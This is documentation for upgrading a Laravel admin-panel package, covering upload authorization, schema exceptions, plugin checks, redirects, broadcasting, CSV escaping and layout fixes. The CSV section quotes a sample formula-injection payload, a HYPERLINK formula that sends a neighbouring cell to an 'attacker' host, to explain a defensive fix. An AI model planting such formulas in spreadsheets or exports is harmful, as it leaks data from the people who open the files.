# Breaking Changes

Every change that needs an edit in an application, what it breaks, and the smallest fix. Nothing
here is a "consider" — if a section applies to your project, doing nothing leaves something
broken. The procedure these edits fit into is the [Upgrade guide](upgrade-guide.md).

## A minimal working example

Before an upgrade, run the three commands that surface most of this list:

```bash
php artisan test            # schema refusals and authorization changes fail here first
php artisan panel:plugins   # a plugin whose constraint no longer resolves
php artisan panel:assets    # published files that carry a client-side half of a fix
```

A schema mistake raises at schema-build time, which is boot or first render — so a suite finds it
before a user does. That is why `php artisan test` is the first line of this page rather than the
last.

## Unreleased

Nine entries need an edit. Two are **silent**: the code keeps running and does the wrong thing.
They are first.

| # | Change | How it shows up |
| --- | --- | --- |
| 1 | Uploads are authorized by the form they belong to | silent — a `viewAny` role could write files |
| 2 | A migration `down()` no longer drops a `notifications` table it did not create | silent — a rollback deleted data |
| 3 | Nine schema mistakes raise `PanelSchemaException` | exception at schema build |
| 4 | `PanelPlugin::publishes()` moved onto the contract | fatal at registration |
| 5 | Plugin `requiresPanel` constraints are checked again | exception at registration |
| 6 | The guest redirect is registered by the service provider | your own rule is overwritten |
| 7 | `/dashboard` sends a signed-in user into a panel | your screen becomes unreachable |
| 8 | Broadcasting is withheld without a configured connection | the panel channel disappears |
| 9 | CSV exports neutralise formula cells | a leading apostrophe in machine-read files |

Plus three that change no API and do change what you see: [layout fixes](#layout-fixes-that-change-what-you-see),
[client-side halves](#fixes-that-live-in-published-files), and
[the testing helpers](#the-testing-helpers-moved-into-the-package).

---

### 1. Uploads are authorized by the form they belong to (silent)

**What changed.** The upload endpoint used to accept `canCreate() || canViewAny()`. Reading a
resource is now never enough:

| Context in the URL | Schema built | Ability asked |
| --- | --- | --- |
| `page=create` | the resource's create form | `create` |
| `page=edit` + `record` | the resource's edit form | `update`, on that record |
| `relation` + `operation` | the relation form | the relation manager's own, per operation |
| `action` + `scope` | the action's form | the action's own `isAuthorizedFor()` |

Authorization and the schema are answered by the same branch, deliberately: a schema built for one
context and a permission asked about another is the bug the endpoint exists not to have.

**What breaks.** Anyone who could previously upload with only `viewAny` now gets a 403. If that was
load-bearing — a read-only role that attaches files — give that role `create` on the model, which
is what it was actually doing:

```php
public function create(User $user): bool
{
    return $user->hasRole('support');   // the role that was uploading on viewAny
}
```

**Also:** `page` is an allowlist rather than "edit, or else create". An unrecognised value used to
become the create form, which is the one branch that needs no record. A `page` that is not `create`
or `edit` is now a 422.

**Also:** the context — resource, page, record, relation, action — is read from the **query string
only**, never from the request body. A form whose values happened to include a `resource` key could
previously point the upload at a different resource.

**If you published the frontend before this change**, the old client copy sends `resource` in the
body, where the server no longer looks:

```bash
php artisan panel:assets --update
npm run build
```

If `resources/js/panel/forms/uploadEndpoint.ts` reads as `yours` or `CONFLICT`, apply the change by
hand: delete the block that copies `resource` out of the URL into the `FormData`. Everything the
server needs is already in the query string.

---

### 2. A migration `down()` no longer drops a `notifications` table it did not create (silent)

**What changed.** `up()` has always skipped the table when the application already had one.
`down()` did not: it ran `dropIfExists()`, so rolling this package back deleted an application's
notifications.

`PandaPanel\Support\PackageSchema` now establishes ownership before dropping anything — no other
ran migration claims the name, and the columns are exactly the ones `up()` creates — and leaves the
table standing whenever the answer is not a clear yes.

**What breaks.** Nothing, unless you relied on the rollback to clean up. An empty `notifications`
table may now survive a `migrate:rollback`:

```bash
php artisan migrate:rollback
php artisan db:table notifications    # still there? that is the new behaviour
```

Drop it by hand if you want it gone.

---

### 3. Nine schema mistakes raise `PanelSchemaException`

**What changed.** Nine things a table, form, action or widget definition could say that cannot be
true now raise `PandaPanel\Exceptions\PanelSchemaException`. Every message names the schema, the
offending name, and the fix.

| Mistake | What it did before |
| --- | --- |
| Two columns with the same name | Two columns sharing one key for the cell value, the visibility state, the search term and the sort |
| Two form fields with the same name | One validation rule; the other field rendered, filled in, submitted and discarded |
| Two filters with the same name | Filter state is keyed by name in the query string, so the second control wrote over the first |
| Two actions with the same name in one set | The endpoint resolved by taking the first, so the second button always ran the first action |
| An action with no `url()`, `action()`, `form()` or `modal()` | A button that did nothing when pressed |
| `defaultSort()` naming a column the table does not have | Serialized, then dropped by the sort whitelist; natural order with nothing to say why |
| An empty name on a column, field or action | No way to match a value, a rule or a request to it |
| A widget column span that is neither a number nor `'full'` | `'ful'` answered `1` — a quarter of the width that was asked for, from a typo |
| A widget column span at a breakpoint the grid does not have (`'sm'`, `'xxl'`) | Skipped in silence, so the line of configuration did nothing |

**What breaks.** Nothing that was working. Every one produced wrong behaviour rather than no
behaviour. What it costs is an exception where there was previously a quiet bug.

**The fix is in the schema, never in config.** Rename one of the two; use `dehydrateTo()` when two
inputs really do write one column; delete the action that does nothing.

```php
use PandaPanel\Forms\Components\PasswordInput;
use PandaPanel\Forms\Components\TextInput;

// Two inputs, one column — the legitimate version of "two fields for one thing".
PasswordInput::make('password');
PasswordInput::make('password_confirmation')->dehydrated(false);

// Or give the second input its own name and point it at the column:
TextInput::make('display_name')->dehydrateTo('name');
```

```php
public function dehydrateTo(string $attribute): static
public function dehydrated(Closure|bool $condition = true): static
```

Numbers out of range are still clamped rather than refused: `columnSpan(99)` is an ask and four is
the honest answer, but a word is a mistake and clamping hides it.

The check runs when the schema is built, which is at boot or on the first render of the page:

```bash
php artisan test
```

---

### 4. `PanelPlugin::publishes()` moved onto the contract

**What changed.** `publishes()` moved from the `Plugin` base class onto the
`PandaPanel\Contracts\PanelPlugin` interface, so `panel:publish` can ask any plugin what it
publishes rather than only the ones that happened to inherit.

**What breaks.** A plugin that implements `PanelPlugin` **directly** — which is what a plugin
shipped as its own package should do — no longer satisfies the interface, and PHP raises a fatal
error when the class is loaded. Add:

```php
/**
 * @return array<string, string>
 */
public function publishes(): array
{
    return [];
}
```

A plugin that extends `PandaPanel\Plugins\Plugin` needs no change; the base class still supplies
it.

---

### 5. Plugin `requiresPanel` constraints are checked again

**What changed.** `PluginCompatibility::PACKAGE` was left as `panda-panel` when the composer
package was renamed to `chocoalano/panel`. `Composer\InstalledVersions::getPrettyVersion()` throws
for a package no installation carries; the class reads that as "not installed as a package" and
answers `null`; and a `null` version skips the constraint. So every `requiresPanel` a plugin
declared had been passing unexamined, in every installation, since the rename.

**What breaks.** A plugin whose constraint your installed version does not satisfy now throws
`PandaPanel\Exceptions\PanelRegistrationException` when it registers — during boot, so every route
*and every artisan command* fails until it is resolved. That is the intended failure: it names the
plugin, the panel, the constraint, and the version you have.

Check before upgrading, not after:

```bash
php artisan panel:plugins
php artisan panel:plugins --panel=admin
```

The fix is one of three: update the plugin, relax its constraint if it is yours, or remove it from
the panel.

```php
use PandaPanel\Plugins\PluginMetadata;

public function metadata(): PluginMetadata
{
    return new PluginMetadata(
        name: 'Billing',
        package: 'acme/panda-billing',
        requiresPanel: '^0.1',   // evaluated by composer/semver against chocoalano/panel
    );
}
```

Three cases are still skipped, and all three mean there is no question to answer: a plugin that
declared no constraint, a framework that is not installed as a composer package, and a branch alias
like `dev-main`. See [Versioning](versioning.md#how-the-constraint-is-checked).

---

### 6. The guest redirect is registered by the service provider

**What changed.** Sending a guest who opens a panel URL to *that panel's* login used to be a manual
step in `bootstrap/app.php`. The service provider now does it, using the same
`afterResolving(Kernel::class)` ordering that made the manual step necessary in the first place.

**What breaks.** Nothing, if your `bootstrap/app.php` has the line the old README told you to add.
It is now redundant and harmless, and you can delete it:

```php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->redirectGuestsTo(PanelLoginRedirect::for(...));   // ← delete
})
```

**If you set your own custom guest redirect**, the package now overwrites it. Turn the automatic
registration off and call into `PanelLoginRedirect` from your own rule:

```php
// config/panda-panel.php
'register_guest_redirect' => false,
```

```php
// bootstrap/app.php
use PandaPanel\Support\PanelLoginRedirect;

$middleware->redirectGuestsTo(
    fn ($request) => PanelLoginRedirect::for($request) ?? route('welcome'),
);
```

```php
public static function for(Request $request): ?string
```

It returns the login URL of the panel the request belongs to, and already falls back to
`route('login')` for a request that is not a panel request — so leaving the automatic registration
on is correct for almost every application.

---

### 7. `/dashboard` sends a signed-in user into a panel

**What changed.** A signed-in user who lands on the starter kit's `/dashboard` is redirected to the
first panel they can enter. It is the counterpart to the guest redirect: that one sends a guest out
to the right login, this one sends a signed-in user into the panel they would otherwise have had to
find by typing its URL. It is a fourth `web` middleware, `RedirectPanelHome`.

**What breaks.** Your `/dashboard` route, its name and `resources/js/pages/Dashboard.vue` are all
untouched — the request is simply answered earlier, so nothing that links to the route name
changes. What breaks is an application whose `/dashboard` is a real screen somebody uses, because
it is now unreachable while signed in.

**If yours is a real screen**, turn it off. This applies to an existing install too: the key is
merged from the package, so having published your config before this release does not opt you out.

```php
// config/panda-panel.php
'home_redirect' => [
    'enabled' => false,
],
```

Or hand over a different path. The values are `Request::is()` patterns, and a path a panel is
itself mounted on is ignored, so a panel at `/dashboard` cannot redirect to itself:

```php
'home_redirect' => [
    'enabled' => true,
    'paths' => ['dashboard', 'home', 'overview'],
],
```

The default is `'paths' => ['dashboard']`.

---

### 8. Broadcasting is withheld without a configured connection

**What changed.** `Panel::$broadcasting` defaults to `true`, so the server used to send a channel
to every signed-in user and the client called `echo()` on it. In an application with no broadcaster
that threw "Echo has not been configured" from inside `onMounted`, which aborted the panel layout's
mount and produced a cascade of `Slot "default" invoked outside of the render function` warnings —
none of which name a broadcaster.

`SharePanelData` now withholds the channel unless a broadcast connection is actually configured:

```php
use PandaPanel\Support\BroadcastSupport;

BroadcastSupport::isConfigured();   // bool
```

and `echo()` is wrapped, so a frontend that never called `configureEcho()` gets one
development-only console warning instead of a broken screen.

**What breaks.** An application that broadcasts from PHP but has `BROADCAST_CONNECTION=null` or
`log` now gets no panel channel. That was already a connection no browser could subscribe to; what
changes is that the panel says so instead of failing at mount.

```bash
php artisan config:show broadcasting.default
```

Set a real connection to get the channel back:

```dotenv
BROADCAST_CONNECTION=reverb
```

---

### 9. CSV exports neutralise formula cells

**What changed.** A cell beginning with `=`, `+`, `-`, `@`, a tab or a carriage return is a formula
as far as Excel, LibreOffice and Sheets are concerned, and they evaluate it when the file is opened
— `=HYPERLINK("http://attacker?x="&A1,"Click")` exfiltrates the row beside it. The attacker is
anyone who can write a record field and the victim is the administrator who opens the export, which
is exactly the shape of an admin panel. Such cells now carry a leading apostrophe, which every
spreadsheet reads as "this is text" and does not display.

**What breaks.** A CSV export consumed by another *program* rather than opened by a person: nothing
evaluates anything there, and the apostrophe is corruption rather than a fix. Turn it off on that
exporter only:

```php
use PandaPanel\Actions\Exports\Exporter;

final class LedgerFeedExporter extends Exporter
{
    public static function escapesFormulas(): bool
    {
        return false;
    }
}
```

```php
public static function escapesFormulas(): bool   // defaults to true
```

Never turn it off for a file a person opens. XLSX was never affected — the writer emits
`t="inlineStr"` cells, and a formula in that format lives in an `<f>` element it does not write.

**Also:** an exporter or importer that declares the same column twice is now refused, and both
refuse an empty column name. The file would otherwise carry two identical headings, and the column
picker keys its selection by name — so choosing one chose both and unchecking it removed neither.

---

## The testing helpers moved into the package

**What changed.** `panelTable()`, `panelForm()`, `panelRecordActions()` and the rest used to live in
this repository's own `tests/` and were not shipped. They are now `PandaPanel\Testing\*`, autoloaded
through composer's `files`, and available in your application's suite with no import and no base
class.

**What breaks.** Nothing in an application — they were not reachable before. If you copied them
into your own `tests/Support/`, **delete your copy**: the shipped functions are guarded by
`function_exists`, so a leftover copy wins silently and will drift out of step with the framework
it is asking about.

```php
panelTable(UserResource::class)->assertCanSeeRecord($user)->assertCount(2);
panelForm(UserResource::class)->assertFieldIsRequired('name');
panelTableActions(UserResource::class)->assertCanNotRun('purgeUnverified');
```

---

## `Password::toPasswordRulesString()` is no longer called directly

**What changed.** Three pages built the browser `passwordrules` attribute with
`Password::defaults()->toPasswordRulesString()`. That method is Laravel 13 only, so on Laravel 12
the login, register, reset-password and security settings screens were a 500 — under a constraint
that claimed to support both.

**What breaks.** Nothing in the package. If you called it in your own panel pages and you support
Laravel 12, use the shipped helper instead — the output is identical:

```php
use Illuminate\Validation\Rules\Password;
use PandaPanel\Support\PasswordRules;

PasswordRules::attribute();                    // uses Password::defaults()
PasswordRules::attribute(Password::min(12));   // an explicit rule
```

```php
public static function attribute(?Password $password = null): string
```

It uses the framework's method where it exists and reproduces its exact output from
`appliedRules()` where it does not.

---

## `panel:install` does more, and asks

**What changed.** It now registers the scaffolded panel in `config/panda-panel.php` itself, checks
the frontend, and offers to create a user. Two of those change what a scripted install does:

- **Provider registration edits the published config file.** If your config has been
  restructured — a `panels` key built from a variable, for instance — it is left alone and
  reported, and you add the line yourself.
- **The user prompt only appears in an interactive terminal.** Be explicit in a script:

```bash
php artisan panel:install --no-user --no-interaction
php artisan panel:user --name=Ada --email=ada@example.com --password=secret --panel=admin
```

```text
panel:install
    {--panel=Admin : The name of the first panel to scaffold}
    {--no-panel : Publish and configure without scaffolding a panel}
    {--no-user : Skip the offer to create a signing-in account}
    {--force : Overwrite files that already exist}
```

Publishing the migrations is also a prompt now, and it defaults to **no** in a non-interactive run.
They already run from the package; publishing them is about ownership. If you publish them, set
`load_migrations` to `false` so the same schema is not applied twice.

---

## Layout fixes that change what you see

No API changed here. What changed is that four declarations that were being ignored now take
effect, so a form or infolist you did not touch can render differently after the upgrade. All four
were reporting the narrowest possible result for the widest possible ask.

| Declaration | Before | Now |
| --- | --- | --- |
| `FormSchema::columns(2)` | Serialized and ignored — the root stacked its nodes in a flex column | The root is a grid like every other container |
| `columns(6)` on any of eleven setters | Fell through to the one-column class | Clamped through `PandaPanel\Support\ColumnCount` to `ColumnCount::MAX`, which is `4` |
| `columnSpan(4)` in a four-column form at `md` | Emitted `md:col-span-4` against two tracks, and the row overflowed sideways | Clamped per breakpoint |
| `columnSpan(2)` meaning "full width" | Correct until the section changed its column count | `columnSpanFull()` compiles to `col-span-full` |

```php
use PandaPanel\Forms\Components\TextInput;
use PandaPanel\Support\ColumnCount;

ColumnCount::MAX;          // 4
ColumnCount::clamp(6);     // 4
ColumnCount::clamp(0);     // 1

TextInput::make('notes')->columnSpanFull();
```

```php
public function columnSpanFull(): static     // Forms\Components\Field, Infolists\Components\Entry
```

Calling `columnSpanFull()` on a `FormSchema` was, and remains, a `BadMethodCallException`: a schema
is the root and has nothing to span. `FormSchema::__call()` now answers that with the mistake and
the corrected chain rather than "Call to unknown method".

`columnSpan()` on an infolist entry now clamps to one instead of accepting `0`.

**What to check after upgrading:** any form that declared `FormSchema::columns()` at the root, any
container asking for more than four columns, and any field that spelled full width as
`columnSpan(2)`.

---

## Fixes that live in published files

These are fixed in the package's copy of a Vue or TypeScript file, which means an application only
gets them after `panel:assets --update` **and** `npm run build`. If one of these symptoms survives
the upgrade, the file is `yours` or `CONFLICT` and needs the change applied by hand.

| Symptom | Published file |
| --- | --- |
| Clearing a table filter puts it straight back from the session | `resources/js/panel/tables/filterParams.ts` and the toolbar |
| An upload 403s or lands against the wrong resource | `resources/js/panel/forms/uploadEndpoint.ts` |
| A four-column form lays out differently from a four-column infolist | `resources/js/panel/lib/grid.ts` |
| Every panel screen renders inside the host's `AppLayout` | the pages under `resources/js/pages/panel/` |
| `vue-tsc` reports errors inside files nobody in your application wrote | `resources/js/panel/types/shared.ts` |

Two of those need a word each.

**Clearing a filter.** The server's rule is that the request wins whenever it mentions a value —
including saying it is empty — and that absence is the only case that falls back to the session.
The old client broke that contract by *deleting* keys when clearing, so "cleared" and "never
mentioned" arrived as the same request. The client now says `filters=` and `search=` out loud.

**Page layouts.** Every published panel page now carries `defineOptions({ layout })`, so an
application no longer needs a `panel/` case in its `app.ts`. Where that case was missing, every
panel screen used to render inside the starter kit's `AppLayout` — host sidebar, no panel
navigation — at HTTP 200 with no error. The one case the package cannot fix from the inside is an
unconditional override in your own `app.ts`:

```ts
page.default.layout = AppLayout;   // ← this wins over defineOptions
```

`panel:install` reads `app.ts` and reports that one by file, line and replacement.

**Published types.** `usePanel` and `useNavigation` no longer depend on a
`declare module '@inertiajs/core'` augmentation in `resources/js/types/`, and the package no longer
ships a declaration for `name`, `auth` or `sidebarOpen` — those are the application's to declare.
If your `vue-tsc` starts complaining about them, declare them in your own `resources/js/types`.

---

## Widened, not broken

Neither of these needs an edit. They are here because an upgrade is where you will look for them.

- **PHP 8.2 is supported.** The floor was `^8.3` and nothing required it. PHP 8.2 resolves through
  Laravel 12, and CI runs that combination.
- **Laravel 11 remains unsupported and cannot be supported.** Every 11.x release is flagged by
  unpatched security advisories, and composer refuses to resolve against it.
- **The panel manifest gained a `panels` key alongside `fingerprint`.** A manifest written by an
  older version still loads unchanged, so an upgrade does not need a cache clear to boot. Outside
  production, a stale manifest now says so instead of silently omitting a resource.

## Notes

- **Two of these are silent, and silence is why they are first.** An upload authorized by
  `viewAny` and a rollback that drops somebody's notifications both look like nothing happening.
- **A schema exception at boot is not a regression.** It is a bug that was already there, now
  named. The message contains the schema, the name and the fix.
- **A plugin can stop the application from booting.** An unsatisfied `requiresPanel` throws during
  registration, so `php artisan panel:plugins` also fails — read the exception, it names the
  plugin.
- **`home_redirect` and every other new config key are merged.** Publishing your config before a
  release does not opt you out of a default added after it.
- **The published-file fixes need two steps.** `panel:assets --update` writes the source;
  `npm run build` puts it in the bundle. Neither alone is enough.
- **Nothing here changes a route name, a publish tag or a config file name.** An application's own
  `use` statements need no edit for any entry on this page.

## See also

- [Upgrade guide](upgrade-guide.md) — the order these edits fit into
- [Versioning policy](versioning.md) — what a version number promises
- [Changelog](changelog.md) — the full release notes, including what did not break
- [Asset manifest](asset-manifest.md), [Resolving asset conflicts](asset-conflicts.md)
- [Package name migration](package-name-migration.md)
- [Plugin compatibility](../plugins/compatibility.md), [Plugin contract](../plugins/contract.md)
- [Home redirect](../configuration/home-redirect.md), [Guest redirect](../configuration/guest-redirect.md), [Migrations](../configuration/migrations.md)
- [File uploads](../forms/file-uploads.md), [Form layouts](../forms/layouts.md)
- [Exporters](../import-export/exporters.md)
- [Broadcasting](../notifications/broadcasting.md)
- [Testing helpers](../testing/helpers.md)
- [`panel:install`](../cli/panel-install.md), [`panel:plugins`](../cli/panel-plugins.md), [`panel:user`](../cli/panel-user.md)
